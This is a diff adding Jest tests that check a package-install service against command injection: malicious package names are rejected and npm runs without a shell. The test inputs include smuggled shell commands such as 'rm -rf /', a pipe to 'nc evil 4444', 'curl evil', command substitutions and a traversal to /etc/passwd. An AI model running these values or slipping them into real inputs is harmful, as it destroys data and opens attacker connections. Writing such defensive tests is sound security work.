@@ -404,4 +404,152 @@ describe('PackageService command-injection hardening', () => {
     expect(viewCalls.length).toBe(1)
     expect(viewCalls[0][1]).toEqual(['view', '@missionsquad/mcp-github', 'version'])
   })
+
+  describe('package name validation', () => {
+    test.each([
+      'left-pad; rm -rf /',
+      'left-pad && curl evil',
+      'left-pad | nc evil 4444',
+      'left-pad`whoami`',
+      'left-pad$(id)',
+      '-rf',
+      '../escape',
+      'PKG WITH SPACES',
+      '../../../../etc/passwd'
+    ])('installPackage rejects malicious name %p', async (malicious) => {
+      const { service } = createService()
+
+      const result = await service.installPackage({
+        name: malicious,
+        version: '1.2.3',
+        serverName: 'some-server'
+      })
+
+      expect(result.success).toBe(false)
+      expect(result.error).toMatch(/Invalid package name/i)
+      // No npm install must have been attempted
+      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
+        Array.isArray(args) && (args as string[]).includes('install')
+      )
+      expect(installCalls.length).toBe(0)
+    })
+
+    test('upgradePackage rejects persisted package with invalid name', async () => {
+      const { service, dbMock } = createService()
+      dbMock.findOne.mockResolvedValue({
+        name: 'evil; touch /tmp/pwn',
+        version: '1.0.0',
+        installPath: 'packages/evil',
+        status: 'installed',
+        installed: new Date('2025-01-01T00:00:00.000Z'),
+        mcpServerId: 'evil-server',
+        enabled: true,
+        runtime: 'node'
+      })
+
+      const result = await service.upgradePackage('evil-server', '1.2.3')
+
+      expect(result.success).toBe(false)
+      expect(result.error).toMatch(/Invalid package name/i)
+      const installCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
+        Array.isArray(args) && (args as string[]).includes('install')
+      )
+      expect(installCalls.length).toBe(0)
+    })
+
+    test('checkForUpdates skips packages with invalid persisted names', async () => {
+      const { service, dbMock } = createService()
+      dbMock.find.mockResolvedValue([
+        {
+          name: 'evil | calc',
+          version: '1.0.0',
+          installPath: 'packages/evil',
+          status: 'installed',
+          installed: new Date('2025-01-01T00:00:00.000Z'),
+          mcpServerId: 'evil-server',
+          enabled: true,
+          runtime: 'node'
+        }
+      ])
+
+      const result = await service.checkForUpdates()
+
+      // The malicious name must not have produced an npm subprocess
+      const viewCalls = execFilePromisifiedMock.mock.calls.filter(([, args]) =>
+        Array.isArray(args) && (args as string[])[0] === 'view'
+      )
+      expect(viewCalls.length).toBe(0)
+      expect(result.updates).toEqual([
+        {
+          serverName: 'evil-server',
+          currentVersion: '1.0.0',
+          latestVersion: 'unknown',
+          updateAvailable: false
+        }
+      ])
+    })
+  })
+
+  describe('runNpm invocation strategy', () => {
+    test('uses node + npm-cli.js (shell:false) when npm-cli.js is locatable', async () => {
+      // Pretend npm-cli.js exists at the first candidate location. The
+      // service should invoke `node <cliPath> install <spec>` with shell
+      // disabled, bypassing npm.cmd / cmd.exe entirely on Windows.
+      existsSyncMock.mockReturnValue(true)
+
+      const { service } = createService()
+
+      const result = await service.installPackage({
+        name: 'left-pad',
+        version: '1.2.3',
+        serverName: 'left-pad-server'
+      })
+
+      expect(result.success).toBe(true)
+
+      // Locate the install call. Args must contain `install` and the spec
+      // as discrete argv tokens, and the shell option must be `false`.
+      const installCall = execFilePromisifiedMock.mock.calls.find(([, args]) =>
+        Array.isArray(args) && (args as string[]).includes('install') && (args as string[]).includes('left-pad@1.2.3')
+      )
+      expect(installCall).toBeDefined()
+
+      const cmd = installCall![0] as string
+      const cmdArgs = installCall![1] as string[]
+      const opts = installCall![2] as { shell?: boolean } | undefined
+
+      // Command should be node (process.execPath), not npm/npm.cmd.
+      expect(cmd).toBe(process.execPath)
+      // First arg must be the resolved npm-cli.js path; install/spec follow.
+      expect(cmdArgs[0]).toMatch(/npm-cli\.js$/)
+      expect(cmdArgs.slice(1)).toEqual(['install', 'left-pad@1.2.3'])
+      // shell must be false — no cmd.exe in the picture.
+      expect(opts?.shell).toBe(false)
+    })
+
+    test('falls back to direct npm invocation when npm-cli.js is not locatable', async () => {
+      // existsSyncMock defaults to false in beforeEach, so the lookup fails.
+      const { service } = createService()
+
+      const result = await service.installPackage({
+        name: 'left-pad',
+        version: '1.2.3',
+        serverName: 'left-pad-server'
+      })
+
+      expect(result.success).toBe(true)
+
+      const installCall = execFilePromisifiedMock.mock.calls.find(([cmd, args]) =>
+        (cmd === 'npm' || cmd === 'npm.cmd') &&
+        Array.isArray(args) && (args as string[])[0] === 'install'
+      )
+      expect(installCall).toBeDefined()
+      expect(installCall![1]).toEqual(['install', 'left-pad@1.2.3'])
+      const opts = installCall![2] as { shell?: boolean } | undefined
+      // Unix fallback uses shell:false; Windows fallback uses shell:true.
+      // The test runs under Jest in this repo (Linux/macOS in CI), so we
+      // expect shell:false here.
+      expect(opts?.shell).toBe(process.platform === 'win32')
+    })
+  })
 })
